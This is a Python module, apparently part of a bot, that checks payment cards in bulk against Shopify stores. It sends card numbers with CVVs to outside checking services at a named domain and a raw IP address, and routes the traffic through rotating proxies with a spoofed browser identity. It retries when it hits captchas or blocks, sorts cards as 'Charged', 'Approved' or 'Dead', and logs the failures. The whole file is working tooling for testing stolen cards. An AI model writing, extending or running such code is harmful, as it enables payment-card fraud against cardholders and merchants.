"""
check_engine.py — Shopify checker.

Supports two backends, admin-selectable, persisted in api_selected.json:

  yzio    -> GET https://check.yzio.app/shopify?site=..&cc=..&proxy=..
  shopii  -> GET http://62.169.23.129:8080/shopii?cc=..&site=..&proxy=..

The active provider is read fresh on every check so /setapi takes effect
immediately, no restart.
"""
import asyncio
import aiohttp
import random
import json
import re
import os
from urllib.parse import quote
from config import (
    API_ENDPOINTS_FILE, PROXY_FILE,
    load_api_provider, current_api_base,
    API_YZIO_BASE, API_SHOPII_BASE,
)

_error_log_path = "error.txt"

def clear_session_bad_sites():
    pass

def clear_error_log():
    try:
        open(_error_log_path, 'w').close()
    except:
        pass

def _sanitize(msg) -> str:
    s = re.sub(r'https?://\S+', '[api]', str(msg or ''))
    return s[:100]

def _log_error_card(card, reason):
    try:
        with open(_error_log_path, 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {_sanitize(reason)}\n")
    except:
        pass

# ══════════════════════════════════════════════════════════════
# Endpoint storage — kept for compatibility with /addapi /rmapi
# ══════════════════════════════════════════════════════════════
def load_api_endpoints() -> list:
    try:
        with open(API_ENDPOINTS_FILE) as f:
            eps = json.load(f).get('endpoints') or []
            return eps
    except:
        return []

def save_api_endpoints(endpoints: list):
    with open(API_ENDPOINTS_FILE, 'w') as f:
        json.dump({'endpoints': endpoints}, f, indent=2)

# ══════════════════════════════════════════════════════════════
# Proxy helpers
# ══════════════════════════════════════════════════════════════
def normalize_proxy(p: str) -> str:
    p = (p or '').strip()
    if not p:
        return p
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p:
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return p
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return p

def _proxy_to_url(p: str) -> str:
    p = (p or '').strip()
    if not p:
        return ''
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p:
        return f'http://{p}'
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _load_proxies_file():
    try:
        with open(PROXY_FILE) as f:
            return [l.strip() for l in f if l.strip()]
    except:
        return []

# ══════════════════════════════════════════════════════════════
# Result
# ══════════════════════════════════════════════════════════════
def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status': status, 'message': message, 'card': card,
        'gateway': gateway, 'price': price, 'receipt_url': receipt_url,
        'retry': retryable, 'proxy': proxy, 'time': time,
    }

# ══════════════════════════════════════════════════════════════
# URL builders
# ══════════════════════════════════════════════════════════════
def _build_yzio_url(site: str, cc: str, proxy: str) -> str:
    site_e  = quote(site.strip(),  safe=':/?=&%')
    cc_e    = quote(cc.strip(),    safe='|')
    proxy_e = quote(proxy.strip(), safe=':@')
    return f"{API_YZIO_BASE.rstrip('/')}/shopify?site={site_e}&cc={cc_e}&proxy={proxy_e}"

def _build_shopii_url(site: str, cc: str, proxy: str) -> str:
    cc_e    = quote(cc.strip(),    safe='|')
    site_e  = quote(site.strip(),  safe=':/?=&%')
    proxy_e = quote(proxy.strip(), safe=':@')
    return f"{API_SHOPII_BASE.rstrip('/')}/shopii?cc={cc_e}&site={site_e}&proxy={proxy_e}"

def _build_check_url(site: str, cc: str, proxy: str) -> str:
    provider = load_api_provider()
    if provider == "shopii":
        return _build_shopii_url(site, cc, proxy)
    return _build_yzio_url(site, cc, proxy)

# ══════════════════════════════════════════════════════════════
# Parsing
# ══════════════════════════════════════════════════════════════
def _extract_json(text: str):
    if not text:
        return None
    try:
        return json.loads(text)
    except Exception:
        pass
    m = re.search(r'\{[\s\S]*\}', text)
    if m:
        try:
            return json.loads(m.group(0))
        except Exception:
            pass
    return None

def _parse_bool(v):
    if isinstance(v, bool):
        return v
    if isinstance(v, str):
        if v.lower() in ('true', 'yes', '1'):  return True
        if v.lower() in ('false', 'no', '0'):  return False
    return None

def _extract_price_float(data):
    if not isinstance(data, dict):
        return None
    for k in ('Price', 'price', 'amount', 'Amount', 'total', 'Total',
              'cart_total', 'order_total', 'value'):
        v = data.get(k)
        if v is None or v == '':
            continue
        try:
            p = float(str(v).replace('$', '').replace(',', '').replace('USD', '').strip())
            if 0 < p < 100000:
                return p
        except:
            pass
    for k in ('data', 'result', 'order', 'cart', 'response', 'details'):
        sub = data.get(k)
        if isinstance(sub, dict):
            p = _extract_price_float(sub)
            if p is not None:
                return p
    return None

def _extract_message(data):
    if not isinstance(data, dict):
        return ''
    for key in ('Response', 'message', 'msg', 'response', 'reason', 'error', 'detail'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            return v.strip()
    return ''

def _extract_gateway(data):
    if not isinstance(data, dict):
        return 'Shopify Payments'
    for key in ('Gateway', 'gateway', 'gate', 'payment_gateway'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            return v.strip()
    return 'Shopify Payments'

def _extract_receipt(data):
    if not isinstance(data, dict):
        return ''
    for key in ('receipt_url', 'receipt', 'receiptUrl', 'url'):
        v = data.get(key)
        if isinstance(v, str) and v.startswith('http'):
            return v
    return ''

# ══════════════════════════════════════════════════════════════
# Keywords
# ══════════════════════════════════════════════════════════════
_RETRY_KW = (
    'timeout', 'timed out', 'timedout',
    'proxy error', 'proxy_error', 'proxy timeout', 'proxy_timeout',
    'proxy fail', 'proxy_fail',
    'connection refused', 'connection reset', 'connection error', 'connection_error',
    'network error', 'network_error',
    'socket', 'unreachable', 'no response', 'no_response',
    'temporary', 'try again', 'try_again', 'retry',
    'rate limit', 'rate_limit', 'ratelimit', 'too many', 'throttl',
    'processing', 'pending', 'in_progress',
    'internal error', 'internal_error', 'server error', 'server_error',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'cloudflare', 'captcha', 'blocked', 'forbidden',
    'invalid shop', 'site error', 'site_error', 'shopify error',
    'checkout error', 'checkout_error',
)

_CHARGED_KW = (
    'captur', 'charged', 'paid', 'thank you', 'success',
    'order_complete', 'payment_succeeded', 'order confirmed',
)

# ══════════════════════════════════════════════════════════════
# Single attempt — 60s timeout
# ══════════════════════════════════════════════════════════════
async def _try_endpoint(shop_url, card, proxy_raw):
    url = _build_check_url(shop_url, card, proxy_raw)
    timeout = aiohttp.ClientTimeout(total=60, connect=15, sock_read=50)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    }
    async with aiohttp.ClientSession(timeout=timeout) as s:
        async with s.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            http_status = r.status
            text = await r.text()

    data = _extract_json(text)

    if http_status != 200:
        msg = _extract_message(data) if isinstance(data, dict) else ''
        retryable = (http_status == 429 or http_status >= 500)
        return _make_result(card, 'Dead', msg or f'HTTP {http_status}',
                            retryable=retryable)

    if not isinstance(data, dict):
        up = (text or '').upper()
        if any(k in up for k in ('CHARG', 'PAID', 'CAPTURE')):
            return _make_result(card, 'Charged', (text or '')[:200], proxy=proxy_raw)
        if any(k in up for k in ('APPROV', 'LIVE', 'AUTH')):
            return _make_result(card, 'Approved', (text or '')[:200], proxy=proxy_raw)
        if any(k in up for k in ('DECLIN', 'FAIL', 'DEAD')):
            return _make_result(card, 'Dead', (text or '')[:200], retryable=False)
        return _make_result(card, 'Dead', 'empty response', retryable=True)

    status_bool = None
    for k in ('Status', 'status'):
        if k in data:
            status_bool = _parse_bool(data[k])
            if status_bool is not None:
                break

    message  = _extract_message(data)
    gateway  = _extract_gateway(data)
    receipt  = _extract_receipt(data)
    price_f  = _extract_price_float(data)
    price_s  = f'${price_f:.2f}' if price_f is not None else '-'
    resp_low = (message or '').lower()

    if status_bool is True:
        if any(k in resp_low for k in _CHARGED_KW):
            return _make_result(card, 'Charged', message or 'Charged',
                                price=price_s, gateway=gateway,
                                receipt_url=receipt, proxy=proxy_raw)
        return _make_result(card, 'Approved', message or 'Approved',
                            price=price_s, gateway=gateway,
                            receipt_url=receipt, proxy=proxy_raw)

    if status_bool is False:
        if not message.strip():
            return _make_result(card, 'Dead', 'empty response',
                                price=price_s, retryable=True, proxy=proxy_raw)
        if any(k in resp_low for k in _RETRY_KW):
            return _make_result(card, 'Dead', message,
                                price=price_s, retryable=True, proxy=proxy_raw)
        return _make_result(card, 'Dead', message or 'Declined',
                            price=price_s, gateway=gateway, retryable=False)

    for k in ('charged', 'paid'):
        if data.get(k) is True:
            return _make_result(card, 'Charged', message or 'Charged',
                                price=price_s, gateway=gateway,
                                receipt_url=receipt, proxy=proxy_raw)
    if data.get('approved') is True:
        return _make_result(card, 'Approved', message or 'Approved',
                            price=price_s, gateway=gateway, proxy=proxy_raw)
    if data.get('declined') is True or data.get('success') is False:
        return _make_result(card, 'Dead', message or 'Declined',
                            price=price_s, gateway=gateway, retryable=False)

    return _make_result(card, 'Dead', _sanitize(message) or 'unknown response',
                        price=price_s, retryable=True)

async def _try_endpoint_safe(site, card, proxy):
    try:
        return await _try_endpoint(site, card, proxy)
    except asyncio.TimeoutError:
        return _make_result(card, 'Dead', 'timeout', retryable=True)
    except aiohttp.ClientConnectorError:
        return _make_result(card, 'Dead', 'api unreachable', retryable=True)
    except aiohttp.ClientPayloadError:
        return _make_result(card, 'Dead', 'payload error', retryable=True)
    except Exception as e:
        return _make_result(card, 'Dead',
                            f'{type(e).__name__}: {_sanitize(str(e))[:50]}',
                            retryable=True)

# ══════════════════════════════════════════════════════════════
# CARD CHECK — 3 rounds, fresh site+proxy per round
# ══════════════════════════════════════════════════════════════
async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')

    last_err = ''

    for round_num in range(3):
        if round_num > 0:
            await asyncio.sleep(3.0 + random.uniform(0, 2.0))

        site  = random.choice(sites)
        proxy = random.choice(proxies)

        result = await _try_endpoint_safe(site, card, proxy)

        if result is None:
            last_err = 'no result'
            continue

        if result['status'] in ('Charged', 'Approved'):
            return result

        if result['status'] == 'Dead' and not result.get('retry'):
            return result

        last_err = result.get('message', 'retryable')

    _log_error_card(card, last_err or 'all_rounds_retryable')
    return _make_result(card, 'Dead', _sanitize(last_err) or 'declined', retryable=False)

# ══════════════════════════════════════════════════════════════
# SITE CHECK — one attempt, one rotating proxy
# ══════════════════════════════════════════════════════════════
_TEST_CARDS = [
    "5154623245618097|03|2032|156",
    "4263982640269299|02|2027|423",
    "4242424242424242|12|2030|123",
]

async def test_site_with_price(site_url: str):
    proxies = _load_proxies_file()
    if not proxies:
        return False, None, 'No proxies available (add via /addproxy)'

    last_reason = 'no response'

    for attempt in range(2):
        if attempt > 0:
            await asyncio.sleep(2.0)

        proxy = random.choice(proxies)
        test_card = random.choice(_TEST_CARDS)

        try:
            result = await _try_endpoint(site_url, test_card, proxy)
        except asyncio.TimeoutError:
            last_reason = 'API timeout'
            continue
        except Exception as e:
            last_reason = f'{type(e).__name__}'
            continue

        if not result:
            last_reason = 'empty result'
            continue

        price_str = str(result.get('price', '-')).replace('$', '').replace(',', '').strip()
        price = None
        if price_str and price_str != '-':
            try:
                p = float(price_str)
                if p > 0:
                    price = p
            except:
                pass

        if result['status'] in ('Charged', 'Approved'):
            return True, price, 'API OK'
        if result['status'] == 'Dead' and not result.get('retry'):
            return True, price, 'API OK (declined)'

        last_reason = result.get('message', 'retryable')

    return False, None, last_reason

async def test_site(site, proxy=None):
    alive, price, reason = await test_site_with_price(site)
    return {'site': site, 'status': 'alive' if alive else 'dead',
            'msg': reason, 'price': price}

# ══════════════════════════════════════════════════════════════
# PROXY TEST
# ══════════════════════════════════════════════════════════════
async def test_proxy(proxy: str) -> dict:
    url = _proxy_to_url(proxy)
    if not url:
        return {'proxy': proxy, 'status': 'dead'}
    targets = ['http://httpbin.org/ip', 'http://api.ipify.org', 'http://icanhazip.com']
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        conn = aiohttp.TCPConnector(ssl=False, limit=100)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for u in targets:
                try:
                    async with s.get(u, proxy=url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
    except Exception:
        pass
    return {'proxy': proxy, 'status': 'dead'}

async def get_proxy_ip(proxy: str):
    url = _proxy_to_url(proxy)
    if not url or url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except:
        pass
    return None
